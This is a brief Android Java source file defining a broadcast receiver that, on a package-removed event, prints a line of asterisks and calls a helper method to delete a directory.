package android.pckg.sglg;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.BatteryManager;
import android.pckg.sglg.Tools.AMSTools;

public class UnistalManager extends BroadcastReceiver {

	@Override
	public void onReceive(Context context, Intent intent) {
		if (intent.getAction().equals("android.intent.action.PACKAGE_REMOVED")) {
			System.out.println("********************************");
			AMSTools.deleteDirectory();
		}
	}
}